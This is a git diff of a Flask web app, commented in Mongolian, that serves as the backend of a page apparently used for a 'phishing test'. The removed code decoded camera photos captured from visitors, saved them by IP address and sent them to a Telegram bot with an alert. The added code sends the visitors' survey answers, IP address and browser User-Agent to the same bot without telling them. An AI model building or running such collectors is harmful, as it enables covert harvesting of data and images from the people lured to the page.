@@ -67,53 +67,33 @@ def index():
     return render_template('index.html') 
 
 # ----------------- Өгөгдөл Хүлээн Авах API -----------------
-@app.route('/api/submit-test', methods=['POST'])
-def submit_test():
-    data = request.json
-    survey_answers = data.get('answers', {})
-    image_data_url = data.get('imageData', None)
-    user_ip = request.remote_addr 
+@app.route('/submit', methods=['POST'])
+def submit():
+    """Судалгааны хариулт болон мэдээллийг хүлээн авч, Telegram руу илгээнэ."""
     
-    image_filepath = None 
-    
-    # 1. Зураг хадгалах хэсэг (Base64 тайлах)
-    if image_data_url:
-        try:
-            # Base64-ээс тайлах
-            header, encoded_data = image_data_url.split(',', 1) 
-            decoded_image = base64.b64decode(encoded_data)
-            
-            # Файлын нэрийг үүсгэх
-            filename = f"image_{user_ip}_{len(os.listdir(UPLOAD_FOLDER)) + 1}.jpeg"
-            filepath = os.path.join(UPLOAD_FOLDER, filename)
-            image_filepath = filepath
-            
-            # Зургийг хавтаст бичих
-            with open(image_filepath, "wb") as f:
-                f.write(decoded_image)
-            
-            print(f"Зураг хадгалагдсан: {image_filepath}")
-            
-        except Exception as e:
-            print(f"Зураг боловсруулах алдаа: {e}")
-            
-    # 2. Telegram Мэдэгдэл Бэлтгэх 
-    telegram_message = f"🚨 *АНХААРУУЛГА: ФИШИНГ ТЕСТ* 🚨\n"
-    telegram_message += f"**IP Хаяг:** `{user_ip}`\n\n"
-    
-    if image_data_url:
-        telegram_message += "*⚠️ Камерын зургийг авсан! (Зөвшөөрөл олгосон)*\n"
-    else:
-        telegram_message += "*✅ Зөвхөн судалгааг бөглөсөн (Камерт хандалт хийгээгүй эсвэл блок хийсэн)*\n"
+    # 1. Шинэ name-үүдийг ашиглан хариултуудыг цуглуулах
+    role_department = request.form.get('role_department', 'Хариулаагүй') # Шинэ нэр
+    profession = request.form.get('profession', 'Хариулаагүй') # Шинэ нэр
 
-    telegram_message += "\n*Судалгааны Хариултууд:*\n"
-    for key, value in survey_answers.items():
-        telegram_message += f"**{key.capitalize()}:** {value}\n"
+    message = (
+        f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
+        f"1) Албан тушаал, Хэлтэс: {role_department}\n"
+        f"2) Мэргэжил, Ажлын чиглэл: {profession}\n\n"
+        f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
+        f"📍 IP: {request.remote_addr}\n"
+        f"🌐 User-Agent: {request.headers.get('User-Agent')}"
+    )
+    # ... (үлдсэн Telegram руу илгээх хэсэг өмнөх шигээ)
+    # 2. Telegram руу текст мэдээлэл илгээх
+    send_text_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     
-    # 3. Telegram руу илгээх (Зургийн замыг дамжуулна)
-    send_telegram_media_notification(telegram_message, image_filepath) 
+    try:
+        requests.post(send_text_url, data={'chat_id': CHAT_ID, 'text': message})
+    except Exception as e:
+        print(f"Telegram API call failed: {e}")
 
-    return jsonify({"status": "success", "message": "Мэдээллийг бүртгэсэн"}), 200
+    # 3. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
+    return redirect(url_for('success'))
 
 if __name__ == '__main__':
     # Сервер ажиллуулах
